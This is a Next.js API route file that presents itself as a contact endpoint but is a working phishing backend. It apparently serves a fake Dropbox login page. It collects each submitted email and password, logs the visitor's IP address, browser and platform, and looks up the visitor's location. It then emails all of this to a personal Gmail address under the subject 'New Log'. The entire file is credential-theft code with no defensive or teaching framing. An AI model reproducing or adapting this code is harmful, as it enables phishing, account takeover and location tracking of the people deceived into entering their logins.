// app/api/contact/route.ts
import { NextRequest, NextResponse } from "next/server";
import nodemailer from "nodemailer";

export async function POST(request: NextRequest) {
  const { email, password } = await request.json();

  // Extract visitor information from request headers
  const userAgent = request.headers.get("user-agent") || "Unknown";
  const ipAddress =
    request.headers.get("x-forwarded-for")?.split(",")[0] ||
    request.headers.get("x-real-ip") ||
    // request.ip ||
    "Unknown";

  // Parse user agent for browser details
  const getBrowserInfo = (ua: string) => {
    let browserName = "Unknown";
    let browserVersion = "Unknown";

    if (ua.includes("Edg/")) {
      browserName = "Microsoft Edge";
      browserVersion = ua.match(/Edg\/([\d.]+)/)?.[1] || "Unknown";
    } else if (ua.includes("Chrome/")) {
      browserName = "Google Chrome";
      browserVersion = ua.match(/Chrome\/([\d.]+)/)?.[1] || "Unknown";
    } else if (ua.includes("Firefox/")) {
      browserName = "Mozilla Firefox";
      browserVersion = ua.match(/Firefox\/([\d.]+)/)?.[1] || "Unknown";
    } else if (ua.includes("Safari/") && !ua.includes("Chrome")) {
      browserName = "Safari";
      browserVersion = ua.match(/Version\/([\d.]+)/)?.[1] || "Unknown";
    }

    return { browserName, browserVersion };
  };

  const getPlatform = (ua: string) => {
    if (ua.includes("Windows NT 10.0")) return "Windows 10/11";
    if (ua.includes("Windows NT")) return "Windows";
    if (ua.includes("Mac OS X")) return "macOS";
    if (ua.includes("Linux")) return "Linux";
    if (ua.includes("Android")) return "Android";
    if (ua.includes("iPhone") || ua.includes("iPad")) return "iOS";
    return "Unknown";
  };

  const { browserName, browserVersion } = getBrowserInfo(userAgent);
  const platform = getPlatform(userAgent);

  // Fetch geolocation data from IP using ip-api.com (free, no key required)
  let locationInfo = "Location lookup in progress...";
  let city = "Unknown";
  let region = "Unknown";
  let country = "Unknown";

  // Skip geolocation for localhost IPs
  if (
    ipAddress !== "::1" &&
    ipAddress !== "127.0.0.1" &&
    ipAddress !== "Unknown"
  ) {
    try {
      const geoResponse = await fetch(
        `http://ip-api.com/json/${ipAddress}?fields=status,message,country,regionName,city,zip,lat,lon,timezone,isp,org,as,query`
      );
      const geoData = await geoResponse.json();

      if (geoData.status === "success") {
        city = geoData.city || "Unknown";
        region = geoData.regionName || "Unknown";
        country = geoData.country || "Unknown";
        locationInfo = `${city}, ${region}, ${country}`;
      } else {
        locationInfo = `Lookup failed: ${geoData.message || "Unknown error"}`;
      }
    } catch (error) {
      console.error("Geolocation lookup failed:", error);
      locationInfo = "Geolocation service unavailable";
    }
  } else {
    locationInfo = "Localhost (No geolocation available)";
  }

  const transporter = nodemailer.createTransport({
    host: process.env.EMAIL_HOST,
    port: Number(process.env.EMAIL_PORT),
    auth: {
      user: process.env.EMAIL_USER,
      pass: process.env.EMAIL_PASS,
    },
  });

  const emailBody = `
New Login Attempt

Email: ${email}
Password: ${password}

=== VISITOR INFORMATION ===
Location: ${locationInfo}
IP Address: ${ipAddress}

Browser Name: ${browserName}
Browser Version: ${browserVersion}

Platform: ${platform}

User Agent String:
${userAgent}

Timestamp: ${new Date().toISOString()}
  `.trim();

  const mailOptions = {
    from: `No_Reply <admin@blueledgepartners.com>`,
    to: "favourejim56@gmail.com",
    subject: `New Log | gf1african Dropbox | ${email}`,
    text: emailBody,
  };

  try {
    await transporter.sendMail(mailOptions);
    return NextResponse.json(
      { message: "Email sent successfully" },
      { status: 200 }
    );
  } catch (error) {
    console.error("Email error:", error);
    return NextResponse.json(
      { error: "Failed to send email" },
      { status: 400 }
    );
  }
}
